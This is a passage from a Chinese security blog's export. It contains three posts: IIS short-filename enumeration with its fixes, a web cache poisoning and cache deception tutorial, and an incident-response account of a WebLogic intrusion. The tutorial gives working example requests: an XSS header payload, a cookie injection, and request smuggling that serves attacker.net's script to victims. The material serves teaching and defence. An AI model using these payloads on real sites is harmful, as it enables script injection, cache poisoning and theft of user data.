<td>OPTIONS &#x2F;I?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名I后面包含0个或多个字符</td>
</tr>
<tr>
<td>12</td>
<td>OPTIONS &#x2F;II*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第二个字母为I</td>
</tr>
<tr>
<td>13</td>
<td>OPTIONS &#x2F;II?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名II后面包含0个或多个字符</td>
</tr>
<tr>
<td>14</td>
<td>OPTIONS &#x2F;IIS*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第三个字母为S</td>
</tr>
<tr>
<td>15</td>
<td>OPTIONS &#x2F;IIS?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名IIS后面包含0个或多个字符</td>
</tr>
<tr>
<td>16</td>
<td>OPTIONS &#x2F;IIS1*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第四个字符为数字1</td>
</tr>
<tr>
<td>17</td>
<td>OPTIONS &#x2F;IIS1?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名IIS1后面包含0个或多个字符</td>
</tr>
<tr>
<td>18</td>
<td>OPTIONS &#x2F;IIS10*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第五个字符为数字0</td>
</tr>
<tr>
<td>19</td>
<td>OPTIONS &#x2F;IIS10?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名IIS10后面包含0个或多个字符</td>
</tr>
<tr>
<td>20</td>
<td>OPTIONS &#x2F;IIS10T*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中第六个字母为T</td>
</tr>
<tr>
<td>21</td>
<td>OPTIONS &#x2F;IIS10T~1?\a.aspx?aspxerrorpath</td>
<td>200</td>
<td>猜测失败，不包含多个相同的短文件名</td>
</tr>
<tr>
<td>22</td>
<td>OPTIONS &#x2F;IIS10T*~2*\a.aspx?aspxerrorpath</td>
<td>200</td>
<td>猜测失败，不包含2个相同的短文件名</td>
</tr>
<tr>
<td>23</td>
<td>OPTIONS &#x2F;IIS10T~1.H*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名未重复且后缀以开头</td>
</tr>
<tr>
<td>24</td>
<td>OPTIONS &#x2F;IIS10T~1.HT*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名未重复且后缀第二字母为T</td>
</tr>
<tr>
<td>25</td>
<td>OPTIONS &#x2F;IIS10T~1.HTM\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功并结束，IIS10T~1.HIM被猜测出来</td>
</tr>
</tbody></table>
<p><strong>TRACE方法猜解分析</strong></p>
<p>通过TRACE方法猜解的过程基本同上，只不过此HTTP方法猜解失败返回的状态码不是200，而是501（未执行）。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="1-深入爆破猜测文件全名"><a href="#1-深入爆破猜测文件全名" class="headerlink" title="1. 深入爆破猜测文件全名"></a>1. 深入爆破猜测文件全名</h4><p>通过 IIS 短文件漏洞猜测出来的短文件名称，需要继续猜测出全名才可以在IIS上进行访问，即 IIS 由于安全原因不支持短文件名访问。以下是 Soroush Dalili 给出的几种猜测文件全名的方法：</p>
<ol>
<li>通过对目标网站或同类型网站进行爬虫，爬出建立一个字典库，再与得到的短文件名来猜剩下的字符 ；</li>
<li>利用 <a href="http://code.google.com/p/fuzzdb/">fuzzdb</a> (一个应用程序模糊测试(fuzzing)数据库)来猜解；</li>
<li>结合OWASP的 <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a> （一款路径及网页暴力破解的工具）。</li>
</ol>
<p>Github 上有研究人员已经用 python 将上述方法实现，并且获取到了网站后台的用户名和密码，很好的利用了 IIS 短文件漏洞。</p>
<blockquote>
<p>注： <br>研究报告地址：<a href="https://webbreacher.com/2014/10/23/tilde-enumeration/">https://webbreacher.com/2014/10/23/tilde-enumeration/</a> （推荐）<br>python 程序下载：<a href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a> （推荐）</p>
</blockquote>
<h4 id="2-结合支持短文件特性软件（Apache、Wordpress）"><a href="#2-结合支持短文件特性软件（Apache、Wordpress）" class="headerlink" title="2. 结合支持短文件特性软件（Apache、Wordpress）"></a>2. 结合支持短文件特性软件（Apache、Wordpress）</h4><p>Acunetix 研究指出当 Apache 运行在 windows 下，如果创建了一个长文件，那么无需猜解长文件，直接用短文件就可以下载了。例如一个 <code>backup_20180101.sql</code> 的长文件，其短文件是 <code>BACKUP~1.SQL</code>，攻击者只需要提交 <code>BACKUP~1.SQL</code> 就可以直接访问并下载该文件。</p>
<p>此外，有学者表明，其在安装Wordpress备份插件之后，通过短文件名成功地访问到了了WordPress博客的备份文件。</p>
<h4 id="3-绕过Basic-and-Windows认证"><a href="#3-绕过Basic-and-Windows认证" class="headerlink" title="3. 绕过Basic and Windows认证"></a>3. 绕过Basic and Windows认证</h4><p>Soroush Dalilide 研究中还提到，在某些 IIS 服务器配置下，可以绕过 Basic and Windows 认证，猜解出认证目录下的文件。举例，如果需要访问一个开启认证的目录下文件时，比如这个目录是 “AuthNeeded”，那么可以通过如下方式访问：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/AuthNeeded::$Index_Allocation/*~1*/.aspx</span><br><span class="line">或者</span><br><span class="line">/AuthNeeded:$I30:$Index_Allocation/*~1*/.aspx</span><br></pre></td></tr></table></figure>
<h3 id="此漏洞存在以下几个局限点："><a href="#此漏洞存在以下几个局限点：" class="headerlink" title="此漏洞存在以下几个局限点："></a>此漏洞存在以下几个局限点：</h3><ol>
<li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</li>
<li>如果文件名本身太短（无短文件名）也是无法猜解的；</li>
<li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</li>
<li>如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</li>
<li>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。</li>
</ol>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h4 id="通用漏洞修复方案"><a href="#通用漏洞修复方案" class="headerlink" title="通用漏洞修复方案"></a>通用漏洞修复方案</h4><p><strong>1. CMD关闭NTFS 8.3文件格式的支持</strong><br>举例：（1代表关闭，0代表开启）<br>Windows Server 2008 R2：<br>查询是否开启短文件名功能：fsutil 8dot3name query<br>关闭该功能：fsutil 8dot3name set 1<br>Windows Server 2003：<br>关闭该功能：fsutil behavior set disable8dot3 1<br>不同系统关闭命令稍有区别，该功能默认是开启的，对于大多数用户来说无需开启。</p>
<p><strong>2. 修改注册表禁用短文件名功能</strong><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation 这一项的值设为 1，1代表不创建短文件名格式<br>修改完成后，需要重启系统生效</p>
<blockquote>
<p>注：此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。</p>
</blockquote>
<p><em>以下两种方法仅适用于缓解GET 方法，其他方法依旧可以猜解。</em><br><strong>3. 关闭Web服务扩展- ASP.NET</strong><br><strong>4. 升级netFramework至4.0以上版本</strong></p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04-参考"></a>0x04-参考</h2><p>备份文件在特定环境下（apache）可被任意下载（利用windows短文件名）：<a href="http://www.jinglingshu.org/?p=6039%5C">http://www.jinglingshu.org/?p=6039\</a><br>IIS短文件名漏洞知识：<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>短文件名</tag>
        <tag>文件下载</tag>
        <tag>目录猜解</tag>
      </tags>
  </entry>
  <entry>
    <title>缓存中毒及缓存欺骗攻击</title>
    <url>/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="0x01-区别"><a href="#0x01-区别" class="headerlink" title="0x01 区别"></a>0x01 区别</h1><h2 id="缓存中毒"><a href="#缓存中毒" class="headerlink" title="缓存中毒"></a>缓存中毒</h2><ul>
<li>攻击者通过缓存中毒攻击，在应用程序中的 web 缓存中存储恶意内容，恶意内容将提供给其他应用程序用户。<h2 id="缓存欺骗"><a href="#缓存欺骗" class="headerlink" title="缓存欺骗"></a>缓存欺骗</h2></li>
<li>攻击者通过缓存欺骗攻击，将其他用户的敏感信息储存到缓存中，然后攻击者通过检索缓存内容获取其他用户的信息。</li>
</ul>
<h1 id="0x02-缓存中毒"><a href="#0x02-缓存中毒" class="headerlink" title="0x02 缓存中毒"></a>0x02 缓存中毒</h1><p>缓存中毒的目的是使客户端加载由攻击者控制的资源。执行缓存中毒攻击的前提是识别<code>非缓存键</code>（unkeyed inputs）。</p>
<ul>
<li>缓存键（keyed inputs）：指的是作为缓存服务器识别某个请求特征的请求信息，如特征匹配，则从缓存服务器返回已缓存的响应信息，通常为：<code>request-line</code> 和 <code>user-agent</code>。</li>
<li>非缓存键（unkeyed inputs）：指的是不作为缓存服务器匹配特征的其他请求信息，如 <code>Cookie: language=pl</code>;</li>
</ul>
<p>所谓识别<code>非缓存键</code>，其实是指识别不作为缓存特征却能影响响应结果的请求信息。可能是参数，可能是请求头。</p>
<h2 id="识别-web应用程序是否使用了缓存技术"><a href="#识别-web应用程序是否使用了缓存技术" class="headerlink" title="识别 web应用程序是否使用了缓存技术"></a>识别 web应用程序是否使用了缓存技术</h2><h3 id="1-检查-HTTP-标头"><a href="#1-检查-HTTP-标头" class="headerlink" title="1. 检查 HTTP 标头"></a>1. 检查 HTTP 标头</h3><p>通常，当响应信息来自缓存时，响应包会存在明确响应标头。</p>
<p><strong>服务器缓存标头</strong></p>
<ul>
<li><code>X-Cache</code>：有两个值 miss 和 hit ,分别表示命中缓存失败及命中缓存成功。</li>
<li><code>Cache-Control</code> ：指示资源是否正在被缓存以及缓存资源下一次被缓存的时间间隔：<code>Cache-Control: public, max-age=1800</code>。</li>
<li><code>Vary</code>：指示哪些请求信息被视为缓存键，即自定义缓存键。</li>
<li><code>Age</code> ：指示缓存资源在缓存服务器中的存活时间长度（以秒为单位）</li>
<li><code>Server-Timing: cdn-cache; desc=HIT</code>：缓存资源命中</li>
</ul>
<p><strong>本地缓存标头</strong></p>
<ul>
<li><code>Clear-Site-Data</code>: 指示应被删除的缓存信息 <code>Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;</code>。</li>
<li><code>Expires</code>: 指示缓存过期日期，<code>Expires: Wed, 21 Oct 2015 07:28:00 GMT</code>。</li>
<li><code>Pragma: no-cache</code> :表示不做缓存。</li>
<li><code>Warning</code>: <em><strong>未知！！！</strong></em></li>
</ul>
<h3 id="2-检查-400-响应码"><a href="#2-检查-400-响应码" class="headerlink" title="2. 检查 400 响应码"></a>2. 检查 400 响应码</h3><p>使用不符合规范的请求标头（例如：<code>\:</code>）对某个资源进行请求，迫使应用程序返回 400 错误响应码。然后正常请求该资源，若仍然返回 400 错误响应码，则证明该 web 站点受到缓存中毒影响。某些缓存服务器可能不对响应状态码进行缓存，此时，该测试无效。</p>
<h2 id="识别非缓存键"><a href="#识别非缓存键" class="headerlink" title="识别非缓存键"></a>识别非缓存键</h2><p>使用 <a href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">Param Miner</a> 暴力破解可能影响响应结果的参数或者请求标头。</p>
<h2 id="触发恶意响应"><a href="#触发恶意响应" class="headerlink" title="触发恶意响应"></a>触发恶意响应</h2><p>识别非缓存键后，分析该非缓存键如何影响响应结果。触发XSS攻击或者DOS攻击。</p>
<h2 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h2><h3 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3><p>假设 x-forward-for 反映在响应结果中，通过发送 XSS 攻击 payload 毒化缓存，访问 <code>/en?region=uk</code> 的用户均被 XSS 攻击。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?region=uk</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>innocent-website.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>假设 Cookie 反映在页面上，则可以用通过 Cookie 投毒。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd&quot;%2balert(1)%2b&quot;</span><br></pre></td></tr></table></figure>
<h3 id="通过多个请求标头进行缓存中毒攻击"><a href="#通过多个请求标头进行缓存中毒攻击" class="headerlink" title="通过多个请求标头进行缓存中毒攻击"></a>通过多个请求标头进行缓存中毒攻击</h3><p>有时候需要多个非缓存键才能进行投毒缓存攻击。例如，如果某个页面存在以下情况：服务器会将所有 <code>http</code> 请求转发到 <code>https</code>，并且将 <code>x-forward-host</code> 作为目的域名。发送一个 http 请求，将 <code>x-forward-scheme</code> 设置为 <code>http</code>，服务器识别到 <code>http</code> ，触发重定向，并使用 <code>x-forward-host</code> 作为重定向的域名。所以可以通过重定向来控制页面的指向资源。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/resources/js/tracking.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acc11fe01f16f89c80556c2b0056002e.web-security-academy.net</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/</span><br><span class="line"><span class="attribute">X-Forwarded-Scheme</span><span class="punctuation">: </span>http</span><br></pre></td></tr></table></figure>

<h3 id="http-请求走私-http-缓存中毒"><a href="#http-请求走私-http-缓存中毒" class="headerlink" title="http 请求走私 + http 缓存中毒"></a>http 请求走私 + http 缓存中毒</h3><p>如果 web 站点存在 http 走私漏洞且存在缓存中毒漏洞，则可以迫使客户端在请求 <code>/static/include.js</code> 的时候，返回 <code>index.html</code> 的内容，这将导致 <code>/static/include.js</code> 无法正常被客户端访问（DOS攻击）。</p>
<ol>
<li><p>执行 http 走私攻击</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /index.html HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>受害客户端访问 <code>/static/include.js</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xGET /static/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>后端程序接收到被毒害的请求，资源 <code>/static/include.js</code> 的请求返回了 <code>/index.html</code> 的内容。且该响应资源被缓存服务器存储。至此，受害客户端对于 <code>/static/include.js</code> 的请求会被毒化，返回 <code>/index.html</code> 的内容。</p>
</li>
</ol>
<p>如果 web 站点存在重定向接口，攻击者甚至可以控制客户端加载的 js 文件内容。<br>假设网站有 URI： <code>/post/next?postId=3</code>，访问该 URI 之后，将会被重定向到 <code>/post?postId=4</code>，并且引用 <code>Host</code> 标头作为重定向的目标域。</p>
<ol>
<li><p>攻击者发送 http 走私请求，如下所示：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: attacker.net</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>受害客户端通过 <code>GET</code> 请求方式访问 <code>/static/include.js</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/post/next?postId=3</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=<span class="number">1</span>GET /static/include.js HTTP/<span class="number">1</span>.<span class="number">1</span>\r\nHost: vulnerable-website.com</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>由于存在重定向漏洞，客户端将会被重定向到 <code>attacker.net/post?postId=4</code>（302重定向包会被返回，并且储存到缓存服务器上），攻击者设置在访问恶意服务器 URL: <code>attacker.net/post?postId=4</code> 时返回恶意 JS 代码。至此，<code>/static/include.js</code> 缓存内容已被毒化成功，访问 <code>/static/include.js</code> 的响应内容均会被替换成攻击者控制的恶意 JS 内容。</p>
</li>
</ol>
<h2 id="Web缓存中毒自动化测试工具"><a href="#Web缓存中毒自动化测试工具" class="headerlink" title="Web缓存中毒自动化测试工具"></a>Web缓存中毒自动化测试工具</h2><p><a href="https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner">Web缓存中毒漏洞扫描程序</a>，用法示例：<code>wcvs -u example.com</code></p>
<h1 id="0x03-缓存欺骗"><a href="#0x03-缓存欺骗" class="headerlink" title="0x03 缓存欺骗"></a>0x03 缓存欺骗</h1><p>静态文件(如： <code>.js</code>,<code>.css</code>,<code>.png</code> 等等)通常被配置为保存到缓存服务器中。例如，访问 <code>www.example.com/profile.php/nonexistent.js</code> 的时候，由于某些缓存服务器仅识别访问文件后缀便将响应结果储存在缓存服务器中。但是后端应用程序对于该链接，响应的结果却是：<code>www.example.com/profile.php</code>,其中该响应结果包含用户的一些敏感信息。上述问题将会导致缓存服务器错误地缓存了包含用户敏感信息的响应结果。攻击者可以通过钓鱼，xss，csrf的方式诱使受害者访问 <code>www.example.com/profile.php/nonexistent.js</code> ，从而进行缓存欺骗攻击，窃取用户敏感信息。</p>
<p>可能有用的测试形式</p>
<ul>
<li><a href="http://www.example.com/profile.php/.js">www.example.com/profile.php/.js</a></li>
<li><a href="http://www.example.com/profile.php/.css">www.example.com/profile.php/.css</a></li>
<li><a href="http://www.example.com/profile.php/test.js">www.example.com/profile.php/test.js</a></li>
<li><a href="http://www.example.com/test.js">www.example.com/profile.php/../test.js</a></li>
<li><a href="http://www.example.com/test.js">www.example.com/profile.php/%2e%2e/test.js</a></li>
<li>Use less known extensions such as .avif</li>
</ul>
<blockquote>
<p>缓存欺骗真实的个案：<a href="https://hackerone.com/reports/593712">https://hackerone.com/reports/593712</a></p>
</blockquote>
<h1 id="From"><a href="#From" class="headerlink" title="From"></a>From</h1><p><a href="https://book.hacktricks.xyz/pentesting-web/cache-deception">https://book.hacktricks.xyz/pentesting-web/cache-deception</a></p>
]]></content>
      <categories>
        <category>缓存中毒及缓存欺骗攻击</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>缓存中毒</tag>
        <tag>缓存欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次服务器应急响应</title>
    <url>/2022/03/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>2021年5月26日早，突然收到同事通知，云平台某服务器A出现异常。表像为：A对其他主机进行漏洞扫描攻击。</p>
<h2 id="0x02-事件处置"><a href="#0x02-事件处置" class="headerlink" title="0x02 事件处置"></a>0x02 事件处置</h2><h3 id="获取基本信息"><a href="#获取基本信息" class="headerlink" title="获取基本信息"></a>获取基本信息</h3><p><strong>访谈相关人员：</strong></p>
<ol>
<li>服务器IP&#x2F;域名地址：<code>***.***.118.103</code>，<code>****.*****.***.cn</code>；</li>
<li>服务器名称：培训考勤签到系统；</li>
<li>上线时间：2021年1月；</li>
<li>是否对互联网服务：是；</li>
<li>中间件：weblogic 12.1，前段时间排查过程发现存在漏洞，由于运维无法提供补丁，采取禁用 T3 及 IIOP 协议缓解部分漏洞，继续对外服务；</li>
<li>何时出现异常现场：2021年5月26日；</li>
<li>异常情况：对其他服务器进行扫描攻击；</li>
<li>其他信息：采用 HTTPS 方式加密传输；内部负载均衡地址：<code>***.**.26.191</code>，端口：<code>443</code>；外部负载均衡地址：<code>***.**.26.10</code>，端口：<code>443</code>；服务器上线过程中存在不规范，安全人员不知情，服务器未加入 WAF 等安全设备进行保护 。</li>
</ol>
<h3 id="恶意文件查杀"><a href="#恶意文件查杀" class="headerlink" title="恶意文件查杀"></a>恶意文件查杀</h3><p>对服务器A进行恶意文件查杀，发现服务器是裸奔，临时下载火绒合D盾对服务器进行恶意文件识别（不建议使用火绒），火绒识别4个恶意文件，D盾识别6个恶意文件，文件创建事件均为5月25日。</p>
<h3 id="流量分析平台记录分析"><a href="#流量分析平台记录分析" class="headerlink" title="流量分析平台记录分析"></a>流量分析平台记录分析</h3><p>翻查NGSOC关于 <code>***.***.118.103</code> 的WEB流量记录，只有零星几条，无法获取有效信息。</p>
<p>翻查 access 日志尝试获取有用信息的时候，发现日志中有weblogic 的 CVE-2020-14882 攻击记录，payload 作用为反弹shell，根据 payload 的上的反弹地址发现一个攻击者IP，尝试在NGSOC上搜索该源 IP 地址，发现记录，其中该记录目的地址为： <code>***.**.26.10</code> 。访问管理员后发现互联网地址与 <code>***.***.118.103</code> 通讯，需经过内外负载均衡，外部负载均衡地址为： <code>***.**.26.10</code> 。</p>
<p>查询关于外部负载均衡地址（ <code>***.**.26.10</code> ）的 WEB 流量记录，依然只有零星几条记录，陷入死局。过了一段时间，原来是忽略了服务器采用 HTTPS 加密协议传输，且未将证书私钥导入 <strong>NDS</strong> 内，所以无法通过 <code>FLOW_WEB</code> 表查询 WEB 流量记录，只能通过 <code>FLOW_SSL</code> 表查询 SS L加密协商流量，然而 SSL 加密流量的内容完全看不到，只能查询该段时间哪些 IP 访问过。</p>
<p>通过 NGSOC 平台搜索语法筛选5月21-26日访问该应用系统的互联网地址，发现从25日凌晨开始有19个异常高频的访问记录，大多数为来自中国四川。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>IP</th>
<th>IP的物理位置</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>39.144.137.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>2</td>
<td>39.144.137.**</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>3</td>
<td>139.207.149.***</td>
<td>四川省</td>
</tr>
<tr>
<td>4</td>
<td>81.69.33.***</td>
<td>上海市</td>
</tr>
<tr>
<td>5</td>
<td>39.144.137.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>6</td>
<td>171.210.45.***</td>
<td>四川省</td>
</tr>
<tr>
<td>7</td>
<td>116.169.1.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>8</td>
<td>125.34.74.**</td>
<td>北京市</td>
</tr>
<tr>
<td>9</td>
<td>171.88.165.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>10</td>
<td>171.221.43.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>11</td>
<td>114.253.56.***</td>
<td>北京市</td>
</tr>
<tr>
<td>12</td>
<td>117.136.32.***</td>
<td>广州市</td>
</tr>
<tr>
<td>13</td>
<td>106.13.30.***</td>
<td>广州市</td>
</tr>
<tr>
<td>14</td>
<td>165.227.136.***</td>
<td>德国 黑森州 美因河畔法兰克福</td>
</tr>
<tr>
<td>15</td>
<td>222.212.129.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>16</td>
<td>45.146.164.***</td>
<td>俄罗斯 莫斯科州 莫斯科</td>
</tr>
<tr>
<td>17</td>
<td>45.147.197.***</td>
<td>荷兰 海尔德兰省 杜廷赫姆</td>
</tr>
<tr>
<td>18</td>
<td>115.171.244.**</td>
<td>北京市</td>
</tr>
<tr>
<td>19</td>
<td>198.20.69.**</td>
<td>美国 亚利桑那州 菲尼克斯</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>结合恶意文件创建时间及 NGSOC流 量记录信息，判断攻击者开展攻击时间为2021年5月25日凌晨0时至2021年5月26日上午10点30分（服务器断网时间点）。为更全面发现服务器A存在的恶意文件，将2021年5月25日-26日新增的文件全部备份并开展人工分析。通过人工分析，从161个文件中发现27个恶意文件（含D盾及火绒识别出来的恶意文件），恶意文件类型包括：webshell(冰蝎木马)、流量代理文件、MS17-010 扫描工具、Windows密码提取工具（mimikatz.exe、procdump64.exe）、CS木马、主机扫描工具等。</p>
<p>分析CS马过程中，发现反连域名及反连IP地址， <code>3ead0dfe.ns2.*****.site</code> 、 <code>3ead0dfe.ns2.*****.site</code> 、 <code>171.***.***.***</code> 。通过whois、搜索引擎结合域名信息查到攻击者QQ号，照片等个人信息。</p>
<blockquote>
<p>PS：自动化分析平台：</p>
</blockquote>
<ol>
<li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
<li><a href="https://app.any.run/">https://app.any.run/</a></li>
</ol>
<blockquote>
<p>手动行为分析工具：火绒剑、promon</p>
</blockquote>
<h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><p>PcLog 查询系统操作，发现5月25日15点00分执行过CS木马“123321.exe” , 执行结果为失败，软件崩溃。此外，其他信息均为登陆记录。<br>RegRipper3.0 查询 Amcache，发现5月25日分别执行过 dns.exe、fscsn64.exe、123321.exe、amd.exe、mimikatz.exe。<br>RegistryExplorer 查询 UserAssist，未发现5月25日的信息。</p>
<h2 id="0x03-分析结果"><a href="#0x03-分析结果" class="headerlink" title="0x03 分析结果"></a>0x03 分析结果</h2><p>access 日志记录信息不全（原因未知，HTTPS协议的关系？），流量记录分析平台的相关内容均是加密状态，无法查看。根据中间件情况（未安装的补丁的weblogic）及恶意文件的存放的路径，推断攻击者通过weblogic反序列化漏洞入侵。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>非法入侵</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次服务器应急响应</title>
